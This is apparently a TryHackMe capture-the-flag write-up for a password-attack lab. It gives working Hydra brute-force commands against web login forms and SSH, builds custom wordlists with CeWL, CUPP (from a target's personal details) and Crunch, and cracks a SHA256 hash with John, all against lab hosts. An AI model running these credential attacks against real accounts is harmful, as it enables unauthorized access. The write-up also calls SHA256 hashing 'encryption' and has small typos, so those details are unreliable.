# Checkmate (Premium Room)
**Platform**: TryHackMe\
**Category**: Web Exploitation\
**Difficulty**: Easy\
**Date**: 6 August 2026\
**Author**: aiskofii

---

## Objective
To conduct a password security assessment to identify weaknesses in Marco’s authentication practices.

## Reconnaissance
Given by the room's description, `http://[MACHINE_IP]:5000`, the first thing I noticed was there are five levels.\
Each level gives a brief description _(or very vague hints, depending on how you look at it.)_ and DNS to lookup. I was able to identify three DNS from each descriptions; `firewall.thm`, `jobs.thm`, and `social.thm`. My first thought was to register these DNS into `/etc/hosts` to manually force your computer to map a specific domain name to a specific IP address.

```
/etc/hosts
[MACHINE_IP]    firewall.thm jobs.thm social.thm
```
---

## Level 1
The hint was given when it stated that Marco kept the default credentials and the placeholder indicated the username, `admin` and 5 characters password. ***Hydra** was first came to my mind as default credentials meant weak passwords. A dictionary attack did the favor. First things first, I submitted the wrong credentials while having inspect elements capturing the network (on the Network tab) and got the POST method.

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
-f -V \
-s 5001 \
firewall.thm http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials."
```

**🚩 Flag Explained**
- `-l admin` : sets the username (admin) to test
- `=P /usr/share/wordlists/rockyou.txt` : sets the wordlist (rockyou.txt) to attempt brute-forcing
- `-f` : stops running once the first valid credentials is found
- `-V` : verbose mode; printing every attempt in real-time
- `-s 5001` : specifies the port (5001)
- `firewall.thm` : defines the target domain
- `http-post-form` : specifies the attack module using HTTP POST forms
- `"/login:username=^USER^&password=^PASS^:Invalid credentials."`
    - `/login` : the endpoint where the attack held
    - `username=^USER^&password=^PASS^` : act as dynamic variables during execution
    - `Invalid credentials.` : the response that tells Hydra an attempt failed

And done. The first flag was captured.

---

## Level 2
The keyword here was "used common company keywords as passwords." So, I did a little digging and found that I could do web crawling to make my own wordlist.\
Hence, the tool ***CeWL*** (Custom Word List Generator)

```bash
cewl -m 8 --lowercase -w company.txt http://jobs.thm:5002
```

**🚩 Flag Explained**
- `-m 8` : specifies the minimum length to 8 characters
- `--lowercase` : focuses on lowercase words
- `-w company.txt` : writes the output into (company.txt)
- `http://jobs.thm:5002` : specifies the domain

By the time I got the custom wordlists, I fired up Hydra to attempt the dictionary attack. Same format as last time but this time, the username had to be `marco`, the custom wordlists, the port `5002`, and the DNS `jobs.thm`.

```bash
hydra -l marco \
-P path/to/wordlists \
-f -V \
-s 5002 \
jobs.thm http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials."
```

---

## Level 3
Once I got passed the `jobs.thm` login page, I was presented with Marco's personal details. I did some diggings (again) and found a Python script called ***CUPP*** (Common User Passwords Profiler) to create a custom wordlist based on someone's personal details, Marco, for example. Basically, this script will prompted first name, surname, nickname, birth date and some other options. Very straightforward script. All I had to do was:

```bash
python3 cupp.py -i
```

which will start up on interactive mode.\
Once the wordlist was ready, again I had to use Hydra. By this time, I already got the gist of it.

```bash
hydra -l marco \
-P path/to/wordlists \
-f -V \
-s 5003 \
social.thm http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials."
```

---

## Level 4

The description said it used SHA256 encryption for every profile picture uploaded. All I had to do was to decrypt it to find the answer.\ There are ways to do this. The first thing that came to my mind was to use ***John***\
First, I opened the picture into a new tab and got the hash (excluding the .png) from the search bar and creates a new .txt file.

```bash
echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt
```

Then, I used John to crack the password hash.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt
```

**🚩 Flag Explained**
- `--wordlist=/usr/share/wordlists/rockyou.txt` : specifies the wordlist to use to attempt a dictionary attack.
- `--format=Raw-SHA256` : focuses on SHA256 hash format to lessen the time to generate output.

---

## Level 5

Marco posted on `social.thm` on how he would have made a password as a suggestion. A company keyword. Capitalize it. Append the year 20XX. And with a cherry on top, an exclamation mark. This alone could help me build a custom wordlist by using ***Crunch***. By taking advantages on the tags in his post; Security, Excellence, Innovation, Digital, and Cloud:

```bash
crunch 13 13 0123456789! -t Security20%%! > passlist.txt; \
crunch 15 15 0123456789! -t Excellence20%%! >> passlist.txt; \
crunch 15 15 0123456789! -t Innovation20%%! >> passlist.txt; \
crunch 12 12 0123456789! -t Digital20%%! >> passlist.txt; \
crunch 10 10 0123456789! -t Cloud20%%! >> passlist.txt
```
**🚩 Flag Explained**
- `13 13 0123456789!` : specifies the min, max, and charset
- `-t Security20%%!` : defines a custom password structure
    - `Security` : A concrete word
    - `20` : A concrete two-digits of a year
    - `%%` : Two variable digits (00 -> 99)
    - `!` : A concrete symbol
 
By the time I got the wordlist from Crunch, immediately I fired up Hydra to attempt a dictionary attack on SSH

```bash
hydra -l marco \
-P path/to/wordlists \
-f -V \
[MACHINE_IP] ssh
```

---

## Tools Used
| Tools | Description |
| --- | --- |
| Hydra | Online network login auditing and password-cracking utility |
| [CeWL](https://github.com/digininja/Cewl) | Web crawler to create custom wordlists |
| [CUPP](https://github.com/mebus/cupp) | Common User Passwords Profiler |
| John | Brute-forcing encrypted password hashes |
| Crunch | Wordlists generator |
